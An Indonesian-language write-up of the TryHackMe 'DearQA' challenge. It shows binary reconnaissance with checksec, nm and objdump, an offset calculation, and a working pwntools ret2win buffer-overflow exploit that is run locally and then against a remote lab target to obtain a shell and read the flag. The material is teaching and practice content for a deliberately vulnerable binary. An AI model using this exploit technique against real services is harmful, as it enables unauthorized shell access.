# 🔍 Write-up: DearQA (TryHackMe Buffer Overflow Challenge)

## 📌 Informasi Umum

- **Nama Challenge**: DearQA  
- **Platform**: TryHackMe  
- **Kategori**: Binary Exploitation / Reverse Engineering  
- **Port Service**: 5700  
- **Tujuan**: Mendapatkan akses shell melalui eksploitasi buffer overflow  

---

### File Identification

```bash
$ file DearQA
DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, ...

```
Biner berarsitektur x86-64 dan tidak di-strip (simbol fungsi masih tersedia). 

$ strings DearQA | grep -E "vuln|Congratulations|/bin/bash" 
vuln 
Congratulations! 
You have entered in the secret function! 
/bin/bash 

Terdapat fungsi bernama vuln yang mencetak pesan sukses dan memanggil /bin/bash. 

$ checksec DearQA 
    Arch:       amd64-64-little 
    RELRO:      No RELRO 
    Stack:      No canary found 
    NX:         NX unknown - GNU_STACK missing 
    PIE:        No PIE (0x400000) 
    Stack:      Executable 
    Stripped:   No 

Interpretasi: 

❌ Tidak ada stack canary → overflow tidak terdeteksi. 
❌ Tidak ada PIE → alamat fungsi statis (mudah diprediksi). 
✅ Stack executable → shellcode mungkin, tapi tidak diperlukan. 
✅ Simbol fungsi tersedia → analisis jauh lebih mudah. 

$ nm DearQA | grep vuln 
0000000000400686 T vuln 

$ objdump -d DearQA | grep -A20 "<main>:" 
4006c3: 55                    push   %rbp 
4006c4: 48 89 e5              mov    %rsp,%rbp 
4006c7: 48 83 ec 20           sub    $0x20,%rsp     ; alokasi 32 byte 
... 
4006fd: 48 8d 45 e0           lea    -0x20(%rbp),%rax  ; buffer di rbp-0x20 
40070e: e8 6d fe ff ff        call   __isoc99_scanf 

# Perhitungan Offset 
Buffer dimulai di rbp - 0x20 (32 byte di bawah rbp). 
Return address disimpan di rbp + 8 (karena push rbp di awal). 
Jarak ke return address: 
(rbp + 8) - (rbp - 0x20) = 0x20 + 8 = 0x28 = 40 byte 

Strategi: Return-to-win (ret2win) 
→ Timpa return address dengan alamat fungsi vuln. 

Python menggunakan pwntools: 
from pwn import * 

payload = b"A" * 40 + p64(0x400686) 

#Tes lokal 
io = process("./DearQA") 
io.recvuntil(b"What's your name: ") 
io.sendline(payload) 
io.interactive() 

You have entered in the secret function! 
Congratulations! 
$ 

# exploitasi 
io = remote("<TARGET_IP>", 5700) 
io.recvuntil(b"What's your name: ") 
io.sendline(payload) 
io.interactive() 

$ cat /home/*/flag.txt 
THM{...} 















